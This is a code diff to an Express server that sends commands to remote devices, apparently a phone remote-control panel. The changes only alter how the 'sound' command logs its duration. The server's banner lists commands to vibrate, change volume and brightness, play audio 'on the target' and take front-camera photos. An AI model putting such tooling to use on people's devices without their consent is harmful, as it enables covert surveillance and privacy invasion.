@@ -158,7 +158,7 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     } else if (command === 'fontsize') {
         console.log(`📏 [FONT SIZE] SETTING -> ${deviceName} (${deviceId}) | SCALE: ${params?.scale || 100}%`);
     } else if (command === 'sound') {
-        console.log(`🎵 [SOUND] PLAYING -> ${deviceName} (${deviceId}) | ACTION: ${params?.action || 'play'}`);
+        console.log(`🎵 [SOUND] PLAYING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 3}s`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -228,7 +228,7 @@ app.post('/api/device/command/result', (req, res) => {
             }
         } else if (deviceCommands[commandIndex].command === 'sound') {
             if (status === 'completed') {
-                console.log(`✅ [SOUND] SUCCESS -> ${deviceName} | SOUND PLAYED`);
+                console.log(`✅ [SOUND] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
             } else {
                 console.log(`❌ [SOUND] FAILED -> ${deviceName}`);
             }
@@ -436,7 +436,7 @@ server.listen(PORT, () => {
 ║  📳 VIBRATE    - Getar perangkat                             ║
 ║  🔆 BRIGHTNESS - Atur kecerahan layar                        ║
 ║  🔊 VOLUME     - Atur volume media                           ║
-║  🎵 SOUND      - Putar suara MP3 di target                   ║
+║  🎵 SOUND      - Putar suara MP3 di target (dengan durasi)   ║
 ║  📏 FONT SIZE  - Atur ukuran font sistem                     ║
 ║  📷 CAMERA     - Ambil foto kamera depan                     ║
 ╠══════════════════════════════════════════════════════════════╣
@@ -450,8 +450,8 @@ server.listen(PORT, () => {
 ║  ✅ [BRIGHTNESS] SUCCESS -> Device | LEVEL: 75%              ║
 ║  🔊 [VOLUME] SETTING -> Device | LEVEL: 50% | TYPE: music    ║
 ║  ✅ [VOLUME] SUCCESS -> Device | LEVEL: 50% | TYPE: music    ║
-║  🎵 [SOUND] PLAYING -> Device | ACTION: play                  ║
-║  ✅ [SOUND] SUCCESS -> Device | SOUND PLAYED                  ║
+║  🎵 [SOUND] PLAYING -> Device | DURATION: 5s                 ║
+║  ✅ [SOUND] SUCCESS -> Device | DURATION: 5s                 ║
 ║  📏 [FONT SIZE] SETTING -> Device | SCALE: 100%              ║
 ║  ✅ [FONT SIZE] SUCCESS -> Device | SCALE: 100%              ║
 ║  📷 [CAMERA] CAPTURING -> Device                              ║
